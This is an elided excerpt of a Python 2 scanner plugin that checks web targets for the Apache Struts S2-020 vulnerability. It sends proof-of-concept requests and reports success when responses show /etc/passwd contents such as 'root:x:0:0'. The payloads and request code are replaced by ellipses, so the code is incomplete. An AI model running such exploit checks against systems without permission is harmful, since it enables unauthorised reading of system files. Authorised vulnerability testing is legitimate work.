...
'''
    ...
    def verity(self):
#        print self.banner
        logger.info("Struts_S2-020_POC checking %s" % self.url)
        ORG_URL = self.url
        ...
        try:
            ...
            for i in range(0, 5):
                ...
                if resp.status_code and "This_Site_Is_Vulnerable_S2020" in resp.content:
                    msg = "Congratulations!!! {url} is vulnerable S2-020.".format(url=self.url)
                    logger.success(msg)
                    return True
            ...
            for poc_add in poc_linux_tom6x7x:
                ...
                if resp.status_code and ("/bin/bash" in resp.content or "root:x:0:0:root:/root" in resp.content):
                    ...
                    return True
            msgError = "sorry!! {url} is no vulnerable.".format(url=self.url)
...
def run(arg):
    ...
    try:
        ...
        print "Struts_S2-020_POC operation error, %s" % e
        return False


def poc(target):
    try:
        plg = WavsPlugin(target)
        res = plg.verity()
        return res
    except Exception, e:
        print "Struts_S2-020_POC operation error, %s" % e
